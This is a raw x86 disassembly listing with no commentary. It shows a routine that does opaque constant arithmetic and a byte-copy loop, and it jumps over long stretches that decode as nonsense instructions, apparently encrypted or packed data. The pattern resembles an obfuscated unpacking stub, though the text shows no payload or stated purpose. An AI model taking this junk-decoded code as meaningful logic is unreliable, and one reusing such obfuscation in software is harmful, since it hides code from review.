  411c7c:	xor    ecx,0xe33ab1
  411c82:	push   esi
  411c83:	mov    DWORD PTR [ebp-0x4],0x5989
  411c8a:	mov    DWORD PTR [ebp-0x8],0x402c1
  411c91:	mov    DWORD PTR [ebp-0xc],0x4114
  411c98:	mov    eax,DWORD PTR [ebp-0xc]
  411c9b:	mov    esi,DWORD PTR [ebp-0x8]
  411c9e:	xor    edx,edx
  411ca0:	sub    eax,0x6cb6
  411ca5:	div    esi
  411ca7:	mov    edx,DWORD PTR [ebp-0x4]
  411caa:	mov    esi,DWORD PTR [ebp+0xc]
  411cad:	or     eax,edx
  411caf:	xor    eax,0x67f1
  411cb4:	mov    edx,ecx
  411cb6:	sub    edx,eax
  411cb8:	mov    DWORD PTR [ebp-0x4],edx
  411cbb:	mov    eax,DWORD PTR [ebp-0x4]
  411cbe:	mov    edx,DWORD PTR [ebp-0x4]
  411cc1:	mov    dl,BYTE PTR [edx+esi*1]
  411cc4:	mov    esi,DWORD PTR [ebp+0x8]
  411cc7:	mov    BYTE PTR [eax+esi*1],dl
  411cca:	mov    eax,DWORD PTR [ebp-0x10]
  411ccd:	mov    edx,DWORD PTR [ebp-0x14]
  411cd0:	jmp    0x411fd9
  411cd5:	xchg   esi,eax
  411cd6:	mov    dh,0x33
  411cd8:	push   edx
  411cd9:	xor    ebx,DWORD PTR [eax+edi*4-0x46]
  411cdd:	push   eax
  411cde:	ret    0x923c
  411ce1:	or     BYTE PTR [edi+0x608c9e52],0xbe
  411ce8:	mov    esi,0xbebec28e
  411ced:	pop    es
  411cee:	sub    eax,0x9daf891b
  411cf3:	pop    edi
  411cf4:	sbb    edx,0xffffffef
  411cf7:	out    0xf6,al
  411cf9:	adc    esi,DWORD PTR [edx+eax*8]
  411cfc:	in     eax,dx
  411cfd:	fmul   DWORD PTR [ecx+0x4c02172d]
  411d03:	jg     0x411ca8
  411d05:	stos   DWORD PTR es:[edi],eax
  411d06:	add    al,0xc3
  411d08:	push   ebx
  411d09:	stos   DWORD PTR es:[edi],eax
  411d0a:	mov    dl,0x3b
  411d0c:	pop    esp
  411d0d:	mov    edi,DWORD PTR [esi+0x70]
  411d10:	xor    bl,0x2
  411d13:	cmp    eax,0x4ad63272
  411d18:	jmp    0x139759c8
  411d1d:	in     al,0x97
  411d1f:	repz dec esp
  411d21:	mov    al,0x1d
  411d23:	jb     0x411cf3
  411d25:	jecxz  0x411d95
  411d27:	add    dh,dl
  411d29:	aaa    
  411d2a:	jmp    0x9db6:0x6fb02237
  411d31:	cld    
  411d32:	cdq    
  411d33:	push   eax
  411d34:	(bad)  [esi-0x54]
  411d37:	xor    DWORD PTR [ebx+0x3a7c95eb],esp
  411d3d:	xor    al,0x9f
  411d3f:	xchg   esp,eax
  411d40:	rol    BYTE PTR [ecx-0x1a66a600],cl
  411d46:	push   edi
  411d47:	rcl    DWORD PTR [edi+eax*8],cl
  411d4a:	sbb    edi,eax
  411d4c:	mov    ecx,0x24b8305
  411d51:	add    DWORD PTR [eax+ebx*1+0x6c],edx
  411d55:	cwde   
  411d56:	mov    gs,WORD PTR [edi-0x75]
  411d59:	or     eax,0x1b01c699
  411d5e:	jmp    0xb9319f2e
  411d63:	leave  
  411d64:	push   ecx
  411d65:	xchg   BYTE PTR [ebx-0x298d563],al
  411d6b:	addr16 mov ds:0xc3c5,eax
  411d6f:	popf   
  411d70:	adc    esi,DWORD PTR [ecx-0x7e]
  411d73:	iret   
  411d74:	repnz push edi
  411d76:	rcl    BYTE PTR [eax-0x5ee4008e],cl
  411d7c:	xchg   edi,eax
  411d7d:	pop    edx
  411d7e:	push   cs
  411d7f:	popa   
  411d80:	xchg   ebx,eax
  411d81:	mov    dh,bh
  411d83:	test   DWORD PTR [edx+0x5457b34c],esp
  411d89:	jmp    0x7686:0x33604bed
  411d90:	ror    DWORD PTR [ecx-0x66],cl
  411d93:	outs   dx,BYTE PTR ds:[esi]
  411d94:	nop
  411d95:	mul    BYTE PTR [ecx-0xedc2a97]
  411d9b:	pushf  
  411d9c:	out    0xce,al
  411d9e:	dec    edx
  411d9f:	test   al,0x6e
  411da2:	jne    0x411deb
  411da4:	pop    ecx
  411da5:	fistp  DWORD PTR [eax]
  411da7:	and    BYTE PTR [ebp+ebx*8-0x47956702],dh
  411dae:	add    eax,0xf77e6dcd
  411db3:	xor    dh,BYTE PTR [ebx]
  411db5:	sar    BYTE PTR [ecx],1
  411db7:	stos   DWORD PTR es:[edi],eax
  411db8:	jg     0x411d3c
  411dba:	push   edx
  411dbb:	jecxz  0x411e1c
  411dbd:	xchg   DWORD PTR [edi-0x1],ecx
  411dc0:	mov    esi,0xb357db67
  411dc5:	sub    esi,DWORD PTR [edx]
  411dc7:	sbb    eax,0x33145555
  411dcc:	icebp  
  411dcd:	xchg   BYTE PTR [edi-0x30],bl
  411dd0:	stos   DWORD PTR es:[edi],eax
  411dd1:	idiv   BYTE PTR [ecx+0x58]
  411dd4:	jo     0x411db9
  411dd6:	cwde   
  411dd7:	mov    DWORD PTR [ecx+ebp*8],0x76160b0
  411dde:	stc    
  411ddf:	cmp    al,bl
  411de1:	inc    ecx
  411de2:	mov    edi,0xadd774a2
  411de7:	sbb    esi,DWORD PTR [edi]
  411de9:	out    dx,eax
  411dea:	iret   
  411deb:	es dec eax
  411ded:	xchg   edi,eax
  411dee:	fadd   QWORD PTR [eax]
  411df0:	nop
  411df1:	mov    dl,0x72
  411df3:	test   BYTE PTR [edi-0x30],al
  411df6:	adc    ebp,ebx
  411df8:	sbb    DWORD PTR [ecx+0x48],0x7d9e800f
  411dff:	clc    
  411e00:	dec    esi
  411e01:	les    esp,FWORD PTR ds:0x13a02aac
  411e07:	dec    esp
  411e08:	(bad)  
  411e09:	cmp    BYTE PTR [edi+0x48b63600],bh
  411e0f:	in     al,0x4d
  411e11:	sbb    esp,DWORD PTR [edx-0x387ffb34]
  411e17:	xor    DWORD PTR [eax],ecx
  411e19:	push   ecx
  411e1a:	mov    al,ds:0x679810ee
  411e1f:	jmp    0xc4f19cc
  411e24:	sbb    BYTE PTR ds:0xcf75b2d0,dh
  411e2a:	sbb    DWORD PTR [esi],ebx
  411e2c:	icebp  
  411e2d:	mov    ds:0xc0d42997,eax
  411e32:	jmp    0x295fc0b4
  411e37:	push   0xbd0f3b8a
  411e3c:	mov    ebx,0xb6c80aa9
  411e41:	scas   al,BYTE PTR es:[edi]
  411e42:	retf   
  411e43:	rcr    BYTE PTR ds:0x801f47f3,cl
  411e49:	or     esi,DWORD PTR ds:0xaeb79939
  411e4f:	mov    ebx,0x867afd1e
  411e54:	inc    ecx
  411e55:	mov    ch,0xc
  411e57:	popa   
  411e58:	sahf   
  411e59:	je     0x411e33
  411e5b:	adc    BYTE PTR [esi-0x4102165],0xbf
  411e62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e63:	je     0x411e81
  411e65:	iret   
  411e66:	test   al,0x6c
  411e68:	loop   0x411ea5
  411e6a:	popf   
  411e6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e6c:	fnstcw WORD PTR [edx]
  411e6e:	push   esi
  411e6f:	scas   eax,DWORD PTR es:[edi]
  411e70:	sub    al,0xda
  411e72:	sar    BYTE PTR [ebp+0x34],cl
  411e75:	xchg   eax,edi
  411e77:	adc    eax,0x17878533
  411e7c:	mov    ah,0x80
  411e7e:	or     edx,DWORD PTR [ebx]
  411e80:	xchg   edx,eax
  411e81:	adc    dh,cl
  411e83:	mov    cl,0x12
  411e85:	ds or  eax,eax
  411e88:	or     dl,BYTE PTR [esi+0xd]
  411e8b:	and    DWORD PTR [edi+0x15b888c8],esi
  411e91:	pop    ecx
  411e92:	push   edx
  411e93:	and    al,0xb8
  411e95:	pop    edx
  411e96:	int3   
  411e97:	(bad)
  411e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e9c:	lods   al,BYTE PTR ds:[esi]
  411e9d:	pop    edx
  411e9e:	(bad)  
  411ea0:	mov    bh,0x30
  411ea2:	adc    dl,BYTE PTR [eax+0x4ae7a85e]
  411ea8:	int3   
  411ea9:	add    BYTE PTR [ebx-0x67],bl
  411eac:	add    dh,dh
  411eae:	retf   0x987c
  411eb1:	loope  0x411f0a
  411eb3:	ins    BYTE PTR es:[edi],dx
  411eb4:	dec    esp
  411eb5:	ins    DWORD PTR es:[edi],dx
  411eb6:	pop    ecx
  411eb7:	out    0xc2,eax
  411eb9:	jb     0x411e4d
  411ebb:	sub    eax,0xbb4e4bb8
  411ec0:	ins    DWORD PTR es:[edi],dx
  411ec1:	sbb    eax,DWORD PTR [eax-0x9]
  411ec4:	lods   eax,DWORD PTR ds:[esi]
  411ec5:	addr16 popf 
  411ec7:	inc    edx
  411ec8:	mov    eax,ds:0x60c0a7fa
  411ecd:	inc    esp
  411ece:	ins    BYTE PTR es:[edi],dx
  411ecf:	push   ebx
  411ed0:	mov    al,ds:0xb63c57d6
  411ed5:	pop    edx
  411ed6:	xor    BYTE PTR [edi],ch
  411ed8:	test   BYTE PTR [esi],cl
  411eda:	fcmovb st,st(3)
  411edd:	jno    0x411e70
  411edf:	xchg   esp,eax
  411ee0:	mov    ah,0x1e
  411ee2:	mov    esp,0x675fe7e1
  411ee8:	jmp    DWORD PTR [edi+edx*8+0x41]
  411eec:	inc    ebx
  411eed:	xchg   ebx,eax
  411eee:	enter  0xc9c4,0x6c
  411ef2:	out    0x97,eax
  411ef4:	mov    edx,eax
  411ef6:	mul    BYTE PTR [esi+ebx*1-0x6336c107]
  411efd:	push   es
  411efe:	ja     0x411f75
  411f00:	xchg   esi,eax
  411f01:	in     eax,dx
  411f02:	dec    esp
  411f03:	fwait
  411f04:	sbb    ecx,ecx
  411f06:	inc    edi
  411f07:	push   edi
  411f08:	push   edx
  411f09:	or     esp,edx
  411f0b:	sub    esp,DWORD PTR [edi]
  411f0d:	sub    DWORD PTR [ebx-0x5b],edx
  411f10:	adc    DWORD PTR [ecx-0x4195d348],ecx
  411f16:	jnp    0x411f47
  411f18:	fwait
  411f19:	pop    di
  411f1b:	dec    esi
  411f1c:	fcompp 
  411f1e:	lahf   
  411f1f:	ss push ss
  411f21:	inc    edx
  411f22:	xor    DWORD PTR [eax],ebp
  411f24:	jecxz  0x411ef5
  411f26:	rcr    BYTE PTR [edi+0xdeab87b],1
  411f2c:	pop    ebp
  411f2d:	imul   esi,DWORD PTR [ebp-0x39],0x1e
  411f31:	jae    0x411edc
  411f33:	js     0x411ecc
  411f35:	icebp  
  411f36:	jo     0x411f0f
  411f38:	cmp    BYTE PTR [edx-0x6],ch
  411f3b:	pop    edi
  411f3c:	cwde   
  411f3d:	push   ds
  411f3e:	jmp    0xc35a:0xd4782203
  411f45:	xor    cl,BYTE PTR [ebx-0x41]
  411f48:	daa    
  411f49:	test   al,0xbf
  411f4b:	xchg   ecx,eax
  411f4c:	and    bh,BYTE PTR [esi+edx*4]
  411f4f:	es ja  0x411f86
  411f52:	sbb    ecx,DWORD PTR [esi-0x6]
  411f55:	or     BYTE PTR [edx-0x5ae892d7],0x20
  411f5c:	inc    edi
  411f5d:	sbb    eax,0x3ebb0d1e
  411f62:	jmp    0x411efe
  411f64:	adc    al,0x74
  411f66:	and    edx,DWORD PTR ds:0xeb8020ca
  411f6c:	jg     0x411ef8
  411f6e:	pushf  
  411f6f:	xor    BYTE PTR [ebx-0x21],0xd7
  411f73:	data16 in al,dx
  411f75:	stos   DWORD PTR es:[edi],eax
  411f76:	in     al,dx
  411f77:	lock fwait
  411f79:	ins    DWORD PTR es:[edi],dx
  411f7a:	imul   eax,esp,0x25c3797e
  411f80:	mov    ch,0x57
  411f82:	sub    esp,DWORD PTR [eax]
  411f84:	add    ebx,DWORD PTR [ecx]
  411f86:	data16 jbe 0x411f21
  411f89:	clc    
  411f8a:	xchg   edx,eax
  411f8b:	cmp    edx,DWORD PTR [edi-0x6e2d55da]
  411f91:	xchg   BYTE PTR [ecx+0xbcc0317],ah
  411f97:	gs or  al,0x90
  411f9a:	loop   0x412007
  411f9c:	xchg   DWORD PTR [edx],ebp
  411f9e:	fiadd  WORD PTR ds:0x70a7ecb7
  411fa4:	jp     0x411f5d
  411fa6:	add    eax,0xd54fdcb1
  411fab:	jge    0x411fee
  411fad:	xchg   DWORD PTR [ecx+0x29],eax
  411fb0:	adc    cl,BYTE PTR [ecx+0x3]
  411fb3:	pop    ebx
  411fb4:	push   edi
  411fb5:	xchg   ebp,eax
  411fb6:	sub    bh,BYTE PTR [edi+0x42fc882a]
  411fbc:	lods   al,BYTE PTR ds:[esi]
  411fbd:	retf   0xdf4d
  411fc0:	push   edi
  411fc1:	sbb    DWORD PTR [ebx-0x7c],esp
  411fc4:	pop    esp
  411fc5:	and    al,0x81
  411fc7:	loopne 0x41203a
  411fc9:	lods   eax,DWORD PTR ds:[esi]
  411fca:	js     0x412032
  411fcc:	mov    ah,0xb
  411fce:	sbb    ecx,ecx
  411fd0:	xchg   esi,eax
  411fd1:	addr16 jbe 0x411f57
  411fd4:	cwde   
  411fd5:	sub    eax,0x69ac97b6
  411fda:	rcl    BYTE PTR [eax+0x23043bd2],0xc2
  411fe1:	or     eax,0x1a40
  411fe6:	xor    eax,0x1ac1
  411feb:	add    ecx,eax
  411fed:	mov    eax,DWORD PTR [ebp-0x18]
  411ff0:	mov    edx,0x7380
  411ff5:	sub    edx,eax
  411ff7:	add    edx,DWORD PTR [ebp-0x1c]
  411ffa:	mov    eax,DWORD PTR [ebp-0x20]
  411ffd:	xor    edx,eax
  411fff:	mov    eax,DWORD PTR [ebp-0x24]
  412002:	and    edx,eax
  412004:	mov    eax,DWORD PTR [ebp+0x10]
  412007:	jmp    0x412310
  41200c:	icebp  
  41200d:	or     DWORD PTR [ebp+0x7c3cad28],0xcf30669c
  412017:	nop
  412018:	cmp    ebp,DWORD PTR ds:0x665c923c
  41201e:	mov    esi,0xbec28ebe
  412023:	mov    esi,0xdcb2bb5f
  412028:	fs out 0x62,al
  41202b:	xchg   BYTE PTR [esp+ebx*4+0x6c75dbed],bl
  412032:	jmp    ecx
  412034:	jmp    0x3dde:0x4a93ff83
  41203b:	lods   eax,DWORD PTR ds:[esi]
  41203c:	add    DWORD PTR [esi],esp
  41203e:	jb     0x411ff6
  412040:	cmp    ch,bh
  412042:	pop    ebp
  412043:	mov    ebx,0x130af8c7
  412048:	mov    ds:0x951a1662,al
  41204d:	test   eax,0x22257093
  412052:	mov    eax,ds:0x1bea2f38
  412057:	cmp    DWORD PTR [edi+0x10802c20],edi
  41205d:	dec    ebx
  41205e:	js     0x4120d1
  412060:	xchg   esp,eax
  412061:	jo     0x41209e
  412063:	repz push ebx
  412065:	jmp    FWORD PTR [esi-0x40]
  412068:	sbb    al,0x0
  41206a:	out    dx,al
  41206b:	mov    ecx,0xaffa579d
  412070:	retf   
  412071:	add    BYTE PTR [eax+0x49e6d86a],cl
  412077:	int3   
  412078:	mov    WORD PTR [edi+0x5c7d194a],cs
  41207e:	dec    ebp
  41207f:	(bad)  [ebx]
  412081:	clc    
  412082:	mov    ch,0x24
  412084:	fild   WORD PTR [ebp+0x45efd7bf]
  41208a:	aad    0x4f
  41208c:	mov    esi,0x6b2c250c
  412091:	jno    0x412033
  412093:	pop    edx
  412094:	mov    al,ds:0xd8141c1e
  412099:	call   0xf168:0x4eb03a2
  4120a0:	mov    edx,0xc772fd40
  4120a5:	mov    eax,ds:0x9cc63ff
  4120aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120ab:	ret    0xa5a8
  4120ae:	adc    BYTE PTR [ebx+0x326ddf0e],dl
  4120b4:	pop    edx
  4120b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120b6:	std    
  4120b7:	in     al,0xc
  4120b9:	iret   
  4120ba:	mov    cs,WORD PTR [eax-0x68abe53e]
  4120c0:	repz dec esp
  4120c2:	nop
  4120c3:	out    dx,eax
  4120c4:	or     BYTE PTR [edi+0x5c37a938],ah
  4120ca:	(bad)  [ebx+0x1f7cd1f9]
  4120d0:	adc    DWORD PTR ds:0x29d2ba09,esi
  4120d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120d7:	xchg   edi,eax
  4120d8:	push   eax
  4120d9:	test   dh,0x50
  4120dc:	inc    ebx
  4120dd:	jb     0x41208b
  4120df:	std    
  4120e0:	mov    edx,0x539c0cb1
  4120e5:	pop    ebp
  4120e6:	push   0x5f3060a7
  4120eb:	fwait
  4120ec:	pop    edx
  4120ed:	stos   DWORD PTR es:[edi],eax
  4120ee:	sar    DWORD PTR [esi+0x78],0x69
  4120f2:	aas    
  4120f3:	clc    
  4120f4:	xor    DWORD PTR [edi],edi
  4120f6:	xor    al,0xb6
  4120f8:	mov    al,0x66
  4120fa:	fsubr  st(7),st
  4120fc:	or     eax,0xa428257a
  412101:	sbb    eax,0x3ccd9a6b
  412106:	mov    cl,0x63
  412108:	cmp    ecx,edi
  41210a:	xchg   DWORD PTR [eax-0x1c],ebp
  41210d:	pop    eax
  41210e:	xor    DWORD PTR [ebx-0x4a7f1aab],0x45
  412115:	fcomi  st,st(0)
  412117:	pop    edx
  412118:	inc    edx
  412119:	pop    ss
  41211a:	mov    dl,0xe2
  41211c:	pop    ds
  41211d:	adc    ch,BYTE PTR [edx]
  41211f:	mov    cl,0xfc
  412121:	fsub   QWORD PTR [edi-0x1063fd44]
  412127:	dec    ebx
  412128:	or     eax,0x123220df
  41212d:	jmp    0x188:0x9fad97c6
  412134:	pusha  
  412135:	mov    cl,0xef
  412137:	jo     0x412162
  412139:	push   ebx
  41213a:	outs   dx,BYTE PTR ds:[esi]
  41213b:	mov    dl,0x60
  41213d:	fcomp  DWORD PTR [eax]
  41213f:	sub    al,0x49
  412141:	clc    
  412142:	jg     0x4121c3
  412144:	test   DWORD PTR [esi-0x179f8b31],esp
  41214a:	retf   
  41214b:	jp     0x412175
  41214d:	pop    es
  41214e:	lds    ebx,FWORD PTR [ebp-0x72]
  412151:	repnz mov ah,0xe4
  412154:	cli    
  412155:	pop    dx
  412157:	shl    ah,cl
  412159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41215a:	test   DWORD PTR [esi+0x77022ae2],0xa93350f5
  412164:	adc    ch,ah
  412166:	jle    0x4121e4
  412168:	sbb    BYTE PTR [edi-0x1a],cl
  41216b:	aaa    
  41216c:	call   0x3e8a1a5d
  412171:	rcr    esi,1
  412173:	add    eax,0xadc2bbd3
  412178:	popf   
  412179:	xor    ebp,DWORD PTR ds:0xacbf6925
  41217f:	shr    DWORD PTR [esp+ebx*1],cl
  412182:	fcomp  DWORD PTR [eax+0xf]
  412185:	sub    BYTE PTR [ebp+eax*4+0xe6e8545],cl
  41218c:	xor    cl,bh
  41218e:	inc    esi
  41218f:	pop    es
  412190:	outs   dx,BYTE PTR ds:[esi]
  412191:	jp     0x41212c
  412193:	sub    al,BYTE PTR cs:[eax-0x7c]
  412197:	loopne 0x412153
  412199:	adc    BYTE PTR [eax-0x47666e6],al
  41219f:	xor    esi,0x6e
  4121a2:	aaa    
  4121a3:	jnp    0x412150
  4121a5:	fnstenv [ecx]
  4121a7:	inc    ebp
  4121a8:	add    dh,BYTE PTR [eax-0xe]
  4121ab:	jb     0x41215c
  4121ad:	enter  0x2baf,0x6d
  4121b1:	and    al,0x69
  4121b3:	dec    esi
  4121b4:	add    al,0x7
  4121b6:	popa   
  4121b7:	pop    ds
  4121b8:	rol    DWORD PTR [eax],1
  4121ba:	mov    ecx,0x7524327b
  4121bf:	retf   
  4121c0:	jp     0x412165
  4121c2:	mov    dl,0x1d
  4121c4:	sar    DWORD PTR [edx],cl
  4121c6:	mov    esi,0xe48847f
  4121cb:	xchg   ebp,eax
  4121cc:	arpl   WORD PTR [edi+ecx*8+0x2d9740ba],dx
  4121d3:	in     al,0xea
  4121d5:	mov    WORD PTR [ecx+0x69625f82],ss
  4121db:	xor    esp,DWORD PTR [eax]
  4121dd:	dec    ecx
  4121de:	sbb    ah,BYTE PTR [ecx-0x6cad5c03]
  4121e4:	push   esp
  4121e5:	lahf   
  4121e6:	loopne 0x4121b3
  4121e8:	inc    ebp
  4121e9:	imul   edi,ebx,0xaaea44a1
  4121ef:	ds jnp 0x4121fa
  4121f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121f3:	cmp    ebx,DWORD PTR [esi+0x4f]
  4121f6:	pop    ecx
  4121f7:	mov    al,0x6
  4121f9:	aam    0x81
  4121fb:	fstp   DWORD PTR [edx-0x6d80d697]
  412201:	or     ecx,esi
  412203:	ss test ah,al
  412206:	push   edi
  412207:	rcr    BYTE PTR [ebx-0x75],cl
  41220a:	(bad)  
  41220b:	push   esp
  41220c:	mov    esp,0xd3f5c1b6
  412211:	push   edx
  412212:	mov    BYTE PTR [edx-0x4c],ch
  412215:	jge    0x4121bd
  412217:	jge    0x412248
  412219:	fcom   QWORD PTR [ecx+ecx*8+0x3d]
  41221d:	(bad)  
  41221f:	xor    ch,al
  412221:	or     eax,0xe23ceae5
  412226:	cmc    
  412227:	(bad)  [edi]
  412229:	dec    eax
  41222a:	dec    edi
  41222b:	and    eax,0x6fda1f52
  412230:	stc    
  412231:	lock jo 0x41224e
  412234:	mov    dh,0x5
  412236:	xor    dh,cl
  412238:	dec    esp
  412239:	mov    ah,0x69
  41223b:	call   0x8d56:0xae9fb290
  412242:	sbb    bh,bl
  412244:	lea    esp,[eax]
  412246:	hlt    
  412247:	pop    eax
  412248:	adc    eax,0xbbc46a65
  41224d:	pop    ds
  41224e:	popf   
  41224f:	sbb    al,bl
  412251:	pop    edx
  412252:	pop    esp
  412253:	adc    dl,BYTE PTR [ebx-0x369a3749]
  412259:	push   ebp
  41225a:	push   esp
  41225b:	sahf   
  41225c:	inc    ebp
  41225d:	push   esp
  41225e:	jb     0x4122bf
  412260:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412261:	add    bl,BYTE PTR [ecx]
  412263:	or     eax,0x7780bddd
  412268:	outs   dx,BYTE PTR ds:[esi]
  412269:	test   BYTE PTR [esi+0x49],bh
  41226c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41226d:	add    DWORD PTR [ebx+0x6d006c35],ebx
  412273:	cli    
  412274:	mov    esi,es
  412276:	imul   ebx,esp,0xffffffdd
  412279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41227a:	dec    ebx
  41227b:	cwde   
  41227c:	into   
  41227d:	pusha  
  41227e:	jg     0x41223f
  412280:	clc    
  412281:	adc    al,0xf5
  412283:	xchg   ecx,eax
  412284:	inc    bh
  412286:	pop    esp
  412287:	les    eax,FWORD PTR [edi]
  412289:	dec    ebp
  41228a:	xchg   edx,eax
  41228b:	rcl    BYTE PTR [eax*8-0x27ee4240],cl
  412292:	xrelease xchg BYTE PTR [edx],cl
  412295:	retf   
  412296:	push   ebx
  412297:	je     0x41225d
  412299:	pand   mm3,QWORD PTR [eax-0x3b]
  41229d:	jl     0x4122ce
  41229f:	(bad)  
  4122a1:	out    0x4,al
  4122a3:	mov    ebp,0x4a045ea9
  4122a8:	dec    esi
  4122a9:	sti    
  4122aa:	(bad)  
  4122ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122ac:	inc    ecx
  4122ad:	jae    0x4122d1
  4122af:	das    
  4122b0:	sbb    BYTE PTR [edi-0xb123d64],dl
  4122b6:	push   esi
  4122b7:	and    ecx,ebx
  4122b9:	scas   al,BYTE PTR es:[edi]
  4122ba:	inc    esi
  4122bb:	addr16 into 
  4122bd:	cmc    
  4122be:	sbb    al,0x18
  4122c0:	cmp    ah,BYTE PTR [ecx+0x2df34489]
  4122c6:	les    ecx,FWORD PTR [ebp-0x39]
  4122c9:	jmp    0x4122af
  4122cb:	add    ecx,ebx
  4122cd:	popf   
  4122ce:	xchg   ebx,eax
  4122cf:	(bad)  
  4122d2:	ja     0x4122d6
  4122d4:	loop   0x412266
  4122d6:	sub    al,0x29
  4122d8:	jbe    0x412297
  4122da:	arpl   WORD PTR [ebp+0x8bdaac],si
  4122e0:	and    DWORD PTR [ebx-0x7848a485],0x8d25db53
  4122ea:	dec    esi
  4122eb:	xchg   ecx,eax
  4122ec:	sbb    al,0x17
  4122ee:	sbb    BYTE PTR [ebx+0x4d],dh
  4122f1:	adc    al,0x75
  4122f3:	rcl    BYTE PTR ds:0x445f46ec,1
  4122f9:	pop    ebp
  4122fa:	dec    edi
  4122fb:	cmp    eax,0xe3a06eeb
  412300:	add    al,BYTE PTR [eax+0x55]
  412303:	pop    ecx
  412304:	push   cs
  412305:	dec    edi
  412306:	xchg   ecx,eax
  412307:	cmp    edi,DWORD PTR [ecx+0x1f6f5b12]
  41230d:	or     BYTE PTR [edi],ah
  41230f:	stos   DWORD PTR es:[edi],eax
  412310:	xor    edx,0x7015
  412316:	sub    eax,edx
  412318:	mov    edx,DWORD PTR [ebp-0x28]
  41231b:	mov    esi,DWORD PTR [ebp-0x2c]
  41231e:	and    edx,0x2a7b
  412324:	lea    edx,[edx+esi*1-0x3571]
  41232b:	mov    esi,DWORD PTR [ebp-0x30]
  41232e:	shr    edx,1
  412330:	or     edx,esi
  412332:	mov    esi,ecx
  412334:	sub    esi,edx
  412336:	add    esi,0x4751
  41233c:	cmp    esi,eax
  41233e:	jbe    0x411c83
  412344:	pop    esi
  412345:	leave  
  412346:	ret    0xc
  412349:	push   ebp
  41234a:	mov    ebp,esp
  41234c:	sub    esp,0x80
  412352:	push   ebx
  412353:	jmp    0x41268c
  412358:	push   0xffffffd2
  41235a:	jnp    0x4122dc
  41235c:	jl     0x412306
  41235e:	mov    edx,0xa0fab73b
  412363:	nop
  412364:	sub    ecx,DWORD PTR [esi]
  412366:	xor    bl,ch
  412368:	sub    al,0x6c
  41236a:	mov    esi,0xbec4edbe
  41236f:	mov    esi,0x8c963b9d
  412374:	mov    ebp,DWORD PTR [eax+0x13]
  412377:	cli    
  412378:	mov    ebp,0x74f4fe07
  41237d:	sbb    eax,0x81b10659
  412382:	sbb    dh,dl
  412384:	adc    DWORD PTR [eax],ecx
  412386:	lahf   
  412387:	ins    DWORD PTR es:[edi],dx
  412388:	mov    esp,0xda15ad48
  41238d:	fdivr  DWORD PTR [edx]
  41238f:	adc    eax,0xc5618c5
  412394:	imul   edx,eax,0xffffffcf
  412397:	int3   
  412398:	pop    eax
  412399:	push   0xd1e0e4b0
  41239e:	push   es
  41239f:	(bad)  
  4123a0:	arpl   WORD PTR [ebx-0x33],bp
  4123a3:	scas   al,BYTE PTR es:[edi]
  4123a4:	sbb    dh,bl
  4123a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123a7:	push   edx
  4123a8:	lock pusha 
  4123aa:	(bad)  
  4123ab:	stc    
  4123ac:	mov    edi,0xf1258ec1
  4123b1:	add    bl,BYTE PTR [ecx+0x5e]
  4123b4:	shl    DWORD PTR [edx-0x3a],cl
  4123b7:	xor    BYTE PTR [edx],0x15
  4123ba:	sbb    ah,BYTE PTR [edi]
  4123bc:	mov    bh,bh
  4123be:	shl    DWORD PTR [edx-0x31624a57],1
  4123c4:	ds adc eax,0xb313e03d
  4123ca:	jb     0x412390
  4123cc:	psrlw  mm6,QWORD PTR [edi+0x457d300e]
  4123d3:	xchg   ebp,eax
  4123d4:	mov    ebx,0x46bf26db
  4123d9:	sbb    al,0xd2
  4123db:	daa    
  4123dc:	nop
  4123dd:	xchg   ebp,eax
  4123de:	fiadd  DWORD PTR [ebx+edx*1]
  4123e1:	jne    0x4123b9
  4123e3:	dec    edx
  4123e4:	es sahf 
  4123e6:	push   ds
  4123e7:	ja     0x4123cb
  4123e9:	adc    DWORD PTR ds:0x75b45452,ecx
  4123ef:	xor    dl,BYTE PTR [ecx]
  4123f1:	jmp    0xd6c0f626
  4123f6:	xchg   ebp,eax
  4123f7:	xchg   bh,ah
  4123f9:	mov    ecx,0xc47cdfb0
  4123fe:	outs   dx,DWORD PTR ds:[esi]
  4123ff:	xchg   DWORD PTR [esi],esp
  412401:	sbb    DWORD PTR [edi+esi*1],edx
  412404:	in     eax,dx
  412405:	jp     0x412409
  412407:	sub    eax,0xfa702af3
  41240c:	sbb    al,0x2b
  41240e:	mov    esi,0x38491cf6
  412413:	jg     0x412417
  412415:	pop    ecx
  412416:	adc    eax,0xd2200755
  41241b:	jo     0x41240c
  41241d:	mov    ch,BYTE PTR [edx+edx*4-0x5d4f5074]
  412424:	mov    WORD PTR [edx+0xa82a774],es
  41242a:	popa   
  41242b:	inc    ebx
  41242c:	inc    edi
  41242d:	outs   dx,BYTE PTR ds:[esi]
  41242e:	jl     0x4124a4
  412430:	mov    esp,0x3c8f3a0d
  412435:	ds mov bl,dl
  412438:	jp     0x4123c4
  41243a:	or     DWORD PTR [edi+0x10f82135],ecx
  412440:	clc    
  412441:	ja     0x4124b3
  412443:	daa    
  412444:	mov    ebx,0xe6bdcc45
  412449:	xchg   edi,eax
  41244a:	dec    eax
  41244b:	hlt    
  41244c:	fsub   DWORD PTR [edx+0x331b644f]
  412452:	arpl   WORD PTR [ebx+0x3b],sp
  412455:	pop    es
  412456:	add    eax,0xf2f68751
  41245b:	inc    esi
  41245c:	pop    ds
  41245d:	xchg   esi,eax
  41245e:	test   DWORD PTR [ecx-0x6353343d],esp
  412464:	mov    edi,0x45f96986
  412469:	sbb    BYTE PTR [eax+esi*4-0x533b27a8],bl
  412470:	cli    
  412471:	cmp    ebp,DWORD PTR [esi]
  412473:	fsubrp st(7),st
  412475:	push   edx
  412476:	push   ecx
  412477:	loop   0x41245d
  412479:	icebp  
  41247a:	or     BYTE PTR [esi+0x45],ah
  41247d:	push   ds
  41247e:	dec    edx
  41247f:	mov    ah,0x1a
